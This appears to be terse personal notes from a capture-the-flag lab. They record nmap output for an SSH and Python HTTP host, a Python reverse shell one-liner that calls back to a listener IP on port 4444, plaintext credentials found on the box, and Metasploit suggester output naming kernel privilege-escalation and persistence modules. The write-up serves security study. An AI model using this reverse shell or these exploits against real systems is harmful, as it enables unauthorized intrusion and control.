---
tags:
  - linux
  - git
---


### start nmap:
```
PORT     STATE    SERVICE        REASON         VERSION
22/tcp   open     ssh            syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 eb:a2:0d:9c:b1:0b:ee:65:e8:67:0f:59:cc:7d:60:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvIg14v+ziU3Mr0SHP7rRA8OwrRXrV4S93itmgHA5lxNpU4xOYZ4gKnzK+G6b3V99PjgLHmzyUGsbq35jurnG3h1Mxt4c3tuRjdiMi3YHorapMFRFKjFhRveruMrrsY/HCECDE9UqbTSTi2VDAy7sTH23grIgolcupY8EHeApw4+rHMR2rJTo5EBiwfuZvIb6Ke0V3eRKK6OCGAZPn4UPuhQfS0BOqmNnxRkn1At1CMiSmoFlMrobUoi9xkxsojfgBvg6BKQ4Ne+xXQHdWlnYU+/G4wfbjbuEKFhKpMPhdj2J7zaTg5zduhVcTHj+1PPZrImnSnbSTI2anWz6l2rYB/pZ5wbGqIk+1ScYibcXaIIKSvWKiOwiguwmhKnz4h7rtv7wLBJDQG0lYzTvfbhndEoIkOA+yocpqgqr3afQ+c0RZR7dMQKCEh1tm2ta+WnIhktt1ZVLigcAZPYEcRTN/HKnByjCoQZvP3Ks3jTJUl+jxWQ9nDot+HHnXZOlu1wU=
|   256 0c:0e:33:75:c2:1b:18:5a:76:8b:dd:e4:40:21:7d:3a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEqR6CVA4dZP5FFN+qiOw+Nd2VbtKYs/q8re3v15ApVyEInVeCXxiCyPaCk4nEPCcCDV7wrJ+M5gEEXS+Tyw0k8=
|   256 01:71:71:8c:65:ca:9a:19:3b:9a:29:fd:93:27:7a:f3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ87WTzklQnPo0V6PZZ4GnCzabDJbAoU2HDmx0TP6p94
1199/tcp filtered dmidi          no-response
3371/tcp filtered satvid-datalnk no-response
4279/tcp filtered vrml-multi-use no-response
6000/tcp filtered X11            no-response
8000/tcp open     http-alt       syn-ack ttl 61 SimpleHTTP/0.6 Python/3.11.2
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
```

Looking at the page it says we need to connect with simpler connection
```html
Try a more basic connection
```

Connection using nc
```sh
nc -nv 10.10.73.238 8000
Connection to 10.10.73.238 8000 port [tcp/*] succeeded!
```

we are connected to the http server. its simple python http server, so we may be able to execute python commands:
```sh
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.104.91",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

found cerds:
 `think`:`_TH1NKINGPirate$_`

```
[*] 10.10.235.254 - 222 exploit checks are being tried...
[+] 10.10.235.254 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0
[+] 10.10.235.254 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 10.10.235.254 - exploit/linux/local/cve_2023_0386_overlayfs_priv_esc: The target appears to be vulnerable. Linux kernel version found: 5.15.0
[+] 10.10.235.254 - exploit/linux/local/netfilter_nft_set_elem_init_privesc: The target appears to be vulnerable.
[+] 10.10.235.254 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.10.235.254 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 10.10.235.254 - exploit/linux/local/sudo_baron_samedit: The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[+] 10.10.235.254 - exploit/linux/persistence/bash_profile: The service is running, but could not be validated. Bash profile exists and is writable: /home/think/.bashrc
[+] 10.10.235.254 - exploit/linux/persistence/init_systemd: The target appears to be vulnerable. /tmp/ is writable and system is systemd based
[+] 10.10.235.254 - exploit/multi/persistence/cron: The target appears to be vulnerable. Cron timing is valid, no cron.deny entries found

```

